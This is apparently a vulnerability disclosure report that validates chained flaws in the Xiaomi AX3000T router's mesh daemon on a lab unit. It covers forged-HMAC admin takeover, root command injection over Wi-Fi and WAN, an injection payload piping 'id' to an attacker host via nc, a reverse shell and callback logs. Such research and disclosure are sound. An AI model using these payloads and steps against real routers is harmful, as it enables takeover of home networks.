# Hardware validation

All results are from a physical Xiaomi AX3000T (RD03v2), `romversion 2.0.28`,
purchased by the reporter for this research. No production or third-party systems
were involved. Target LAN IP `192.168.31.1`; attacker host `192.168.31.231` on the
router's Wi-Fi.

## Environment

`GET /cgi-bin/luci/api/xqsystem/init_info` (unauthenticated):

```
romversion 2.0.28 | hardware RD03v2 | model xiaomi.router.rd03v2
```

The inbound CAP listener on port 19553 is closed until the device is initialized;
`/etc/init.d/cab_meshd` starts the CAP server (`-S -i br-lan`) only when
`INITTED=YES`. On a factory-reset unit, runtime WAN assignment instead starts the
RE client (`-C -i eth1.4`), which broadcasts discovery and connects outbound to a
CAP. CAP-side TLS, with **no client certificate**, succeeds: `TLSv1.2`,
`ECDHE-RSA-AES256-GCM-SHA384`, server cert `CN=xiaoqiang` / issuer
`CN=xiaoqiang-cn`.

## V1 — admin takeover: CONFIRMED end-to-end (read-only against the target)

`poc/extract_admin.py --host 192.168.31.1`:

```
[A] TLS up on 192.168.31.1:19553 (no client cert)
[A] sent type-4 auth (forged constant-key HMAC) ; type-5 -> ST_RUNNING
[A] leaked web_passwd256 = 73a1d6d0…fa8cdfa24
[B] LOGIN OK  stok=<32 hex>
```

The minted `stok` is a valid admin session — verified independently by calling an
authenticated endpoint with it:

```
GET …/;stok=<stok>/api/misystem/router_info
-> {"mac":"50:92:6A:70:CF:D7", … real device data … }
```

The PoC never sends the `type-7` trigger, so the device is unchanged by this test.
The forged-auth derivation was cross-checked against the daemon's own debug log,
which prints the incoming peer's key (`q38d364d…`) and expected `pass`; the Python
`base64(HMAC_SHA256("q38d364d…", id))` reproduces it exactly.

**V1 is reproducible on demand when the initialized CAP listener is reachable.**
It does not depend on the CAP root sink's `NETMODE` gate.

## V2 OTA — root RCE via Wi-Fi: CONFIRMED end-to-end on physical hardware

The OTA combined chain (V1 → V2) was reproduced multiple times on the same physical
RD03v2 unit. The full sequence runs purely over Wi-Fi with no WAN cable.

### Procedure

1. Factory-reset the device; run `poc/init_router.py --host 192.168.31.1 --reboot` to
   bring it to `INITTED=YES` (opens TCP 19553). This uses the minimal
   `/api/xqsystem/router_init` path, **not** the normal Xiaomi web wizard.
   `NETMODE` remained unset before the V2 trigger. Normal web setup can call
   `init_cap 2` and set `whc_cap`, which skips the demonstrated CAP sink.
2. Start `poc/ota_rce.py --host 192.168.31.1 --attacker 192.168.31.231` (the PoC
   automates all remaining steps, but manually:)
   - V1 (`extract_admin.py`) leaks `web_passwd256`, mints admin `stok`.
   - Admin API `set_wifi_without_restart` plants injection payloads into the
     `encryption` UCI keys for wifiIndex 1 (2.4 GHz) and 2 (5 GHz). SSID preserved.
   - Read-back via `wifi_detail_all` confirms the payloads are stored verbatim.
   - `rce_poc.py`-style `type-4→5→7` trigger fires `cap_init`.
3. Attacker's web server captures:

```
[22:05:07] 192.168.31.1 "GET /s HTTP/1.1" 200 -
*** ROOT CALLBACK: /pwned?uid=0_user=root_host=XiaoQiang ***
[22:05:07] 192.168.31.1 "GET /pwned?uid=0_user=root_host=XiaoQiang HTTP/1.1" 200 -
```

4. The self-repairing payload restores valid Wi-Fi encryption (`psk2`); the attacker's
   laptop reconnects automatically. The device stays online throughout.

5. The reconnecting reverse shell connects back to the attacker's `nc -l -p 4444`:

```
/bin/sh: can't access tty; job control turned off
BusyBox v1.36.1 (2025-12-24 02:43:56 UTC) built-in shell (ash)

~ #
```

### Interactive root shell output

Commands sent through the reverse shell and their output:

```
===START===
uid=0(root) gid=0(root)
---
Linux XiaoQiang 4.4.60 #0 SMP PREEMPT Wed Dec 24 02:43:56 2025 armv7l GNU/Linux
---
RD03v2
---
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 192.168.31.1:19553      0.0.0.0:*               LISTEN      2237/cab_meshd
tcp        0      0 0.0.0.0:784             0.0.0.0:*               LISTEN      3933/tbusd
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      629/nginx: worker p
tcp        0      0 127.0.0.1:54322         0.0.0.0:*               LISTEN      3747/miio_client
tcp        0      0 192.168.31.1:8883       0.0.0.0:*               LISTEN      333/mosquitto
tcp        0      0 127.0.0.1:54323         0.0.0.0:*               LISTEN      3747/miio_client
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      3519/dnsmasq
tcp        0      0 192.168.31.1:53         0.0.0.0:*               LISTEN      3519/dnsmasq
tcp        0      0 192.168.32.1:53         0.0.0.0:*               LISTEN      3519/dnsmasq
tcp        0      0 127.0.0.1:8920          0.0.0.0:*               LISTEN      1659/fcgi-cgi
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      629/nginx: worker p
tcp        0      0 :::8099                 :::*                    LISTEN      629/nginx: worker p
tcp        0      0 :::80                   :::*                    LISTEN      629/nginx: worker p
tcp        0      0 :::443                  :::*                    LISTEN      629/nginx: worker p
===END===
```

### What this proves

- **Arbitrary code execution as root** on physical hardware in the documented
  gate-open setup state, over Wi-Fi, without admin or mesh credentials.
- **The `eval` sink is live and reachable** through the `mgmt_2g`/`mgmt_5g` →
  `encryption` UCI path on real stock firmware.
- **The self-repair works**: the device stays online, the attacker maintains
  connectivity, and the reverse shell persists.
- **The full chain is automated**: V1 admin takeover → V2 root RCE → interactive
  shell, all from a single script (`poc/ota_rce.py`).

This does not establish V2 reachability after ordinary Xiaomi web setup.

---

## V2 RE/WAN — direct root RCE: CONFIRMED end-to-end on physical hardware

Test date: 2026-10-01. The router began at factory defaults:

```
hardware=RD03v2  romversion=2.0.28  inited=0
```

The WAN-side test segment was isolated at `192.168.77.0/24`; the rogue CAP host
used `192.168.77.1`, and DHCP leased `192.168.77.142` to the router's WAN MAC.
No V1 leak, web login, admin API, or `init_router.py` action occurred in the final
exploit run.

### Startup and discovery

Despite `option ifname ''` in the shipped static config, boot-time port assignment
populated `network.wan.ifname=eth1.4` before `START=99`. The live daemon command was:

```
/usr/sbin/cab_meshd -C -i eth1.4
```

It obtained the DHCP lease, created `/tmp/cab_meshd_gw_ip`, and broadcast the
18-byte NUL-terminated RE marker every five seconds:

```
192.168.77.142 -> 255.255.255.255:19553  MIROUTE_RE_DDv1.0\0
```

The rogue CAP returned `MIROUTE_CAP_DDv1.0` plus `192.168.77.1` at offset `0x12`.
The RE then initiated TCP and TLS to the advertised address.

### Reversed authentication

The RE's initial type-4 used the `q38d…` role key. The rogue CAP replied with a
type-4 token computed from the statically predicted
`x38d364d8ed3bd085e150211ea6b3715` key. The hardware accepted it:

```
[RE]: ST_SSL_DONE -> ST_AUTH_SENT
[RE]: ST_AUTH_SENT -> ST_AUTH_SENT_2
INF: id: roguecap00001, ... key: x38d364d8ed3bd085e150211ea6b3715
[RE]: ST_AUTH_SENT_2 -> ST_RUNNING
```

TLS negotiated `TLSv1.2 ECDHE-RSA-AES256-GCM-SHA384`; the rogue CAP used a
self-signed certificate and required no client certificate.

### Type-6 delivery and root proof

The accepted sync body was 1,764 bytes, matching the stock CAP's layout. Four
ordinary front-haul password and management fields had to be populated for both
bands. With the factory body those fields are empty; unquoted `$@` in
`run_with_lock` drops them and shifts the later `bh_ssid`/`bh_pswd` values away
from `do_re_init` `$7/$8`.

The final payload occupied `bh_pswd` at body offset `0x107`:

```
`id|nc 192.168.77.1 80`
```

The RE accepted type-6 (`type-7 body[0]=1`), invoked `mesh_connect.sh re_init`,
decoded the base64-laundered field, and called back:

```
[ROOT PROOF] callback from 192.168.77.142: uid=0(root) gid=0(root)
[+] CONFIRMED: RE/WAN payload executed as uid 0 (root)
```

The proof expression is 23 bytes. The daemon encoder accepts up to 36/66 raw bytes
for the two fields; their reliable non-overlapping wire slots hold 32/64 bytes.

### State and cleanup

A completed `re_init` set `INITTED=YES` (`init_info.inited=1`), stopped `cab_meshd`, changed the wired DHCP
client from the WAN MAC to the LAN MAC, and made the wired interface part of the
new mesh configuration. The path is therefore one-shot after a successful run,
even though `do_re_init` lacks a `NETMODE` guard and `check_re_initted` is unused.

After validation, the router was factory-reset and rechecked as RD03v2 stock
2.0.28 with `inited=0`. The isolated DHCP namespace and listener were removed.
PoC: `poc/re_wan_rce.py`.

---

## V2 CAP/LAN — direct root RCE: CONFIRMED in emulation (daemon-driven)

Under the qemu-user harness running the **real stock `cab_meshd` binary and shell
scripts**, with a clean on-disk config (`NETMODE` unset), a client that completed the
`4→5→7` handshake and placed `base64("`>W`")` in the type-4 **plant** (`body[0x90]`)
drove `mimesh_init.sh:717`'s `eval` to execute the redirect **as root**, creating
`/W` (`root:root`). An `` `id` `` payload put `uid=0(root)…` in `bh_ssid`. This is
arbitrary root command execution from an unauthenticated TCP client, through the full
daemon path. Reproduced independently.

Instrumentation logged `NETMODE=[]` (gate open) at the guard (`do_cap_init:1043`) on
the first trigger, and the on-disk config showed `NETMODE=whc_cap` afterward — i.e.
the first `cap_init` fires the eval, then self-gates (one-shot).

### Two earlier mistakes, corrected

1. **The delivery bug.** An interim `rce_poc.py` placed the base64 payload in the MAC
   header field instead of the plant, so it never landed in `do_cap_init`'s `$6`; the
   daemon-driven flow therefore appeared "not to fire." With the payload in the plant
   (`handshake.py --plant` / the fixed `rce_poc.py`), it fires. A contributing factor
   in some runs was a polluted on-disk config (a prior `whc_cap` left on disk).
2. **The `reboot` retraction still stands** — and is over-determined: `` `reboot` ``
   (8 bytes → 12 base64 chars) does not even fit the CAP plant budget, so it was never
   the eval. The brief blip seen for `` `reboot` ``/`` `halt` ``/`` `telnetd` `` is the
   `cap_delete_vap` teardown that runs before the guard, not the payload.

### CAP/LAN direct injection not re-confirmed on hardware

The direct CAP-path injection (type-4 plant) was not re-fired on the physical unit
after the delivery fix because the tested box is `NETMODE=whc_cap`-gated. The RE/WAN
variant is separately confirmed on factory-reset hardware above. The OTA combined
chain remains the demonstrated route for the initialized, gate-open CAP state.

## V3 — root credential

- The telnet-enable endpoints are gone on 2.0.28: `GET …/;stok=<stok>/api/misystem/
  set_telnet` and `…/get_telnet` both return **"No page is registered"** (while
  `router_info` with the same stok returns real data — so the stok is valid and the
  endpoints are genuinely absent). No network login surface for the derived
  password on this firmware.
- The `mkxqimage` password algorithm was verified against the public worked example
  (`SN 37668/A1ZZ16727 → 6f4f0acc`), reproduced exactly in Python.

## Footprint / cleanup

V1 testing changes nothing on the device (no `type-7`). The V2 OTA hardware test
involved multiple factory-reset + re-init cycles (all reversible; the unit is a
disposable lab device purchased for this research). The OTA payload modifies the
Wi-Fi `encryption` UCI keys and triggers a `cap_init` reconfiguration; the
self-repairing payload restores valid encryption afterward. No credential was used
against the device beyond the automatically-obtained admin session; the
`set_telnet` call errored (endpoint absent) and changed nothing.
The RE/WAN test changes configuration when `re_init` completes; the unit was
factory-reset after the root callback and verified at `inited=0`.
